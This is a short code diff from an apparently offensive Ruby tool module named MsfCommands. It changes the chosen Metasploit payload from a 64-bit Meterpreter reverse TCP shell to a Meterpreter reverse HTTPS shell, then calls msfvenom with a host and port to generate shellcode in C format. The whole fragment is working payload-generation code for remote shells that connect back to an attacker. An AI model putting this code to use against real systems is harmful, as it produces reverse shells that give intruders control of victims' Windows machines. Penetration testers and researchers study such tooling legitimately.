@@ -133,8 +133,8 @@ module MsfCommands
       print_error('Metasploit Not Found!')
       exit
     end
-    @set_payload = 'windows/x64/meterpreter/reverse_tcp'
-    #@set_payload = 'windows/meterpreter/reverse_https'
+    #@set_payload = 'windows/x64/meterpreter/reverse_tcp'
+    @set_payload = 'windows/meterpreter/reverse_https'
     print_info("Generating shellcode\n")
     execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
     print_success("Shellcode Generated\n")
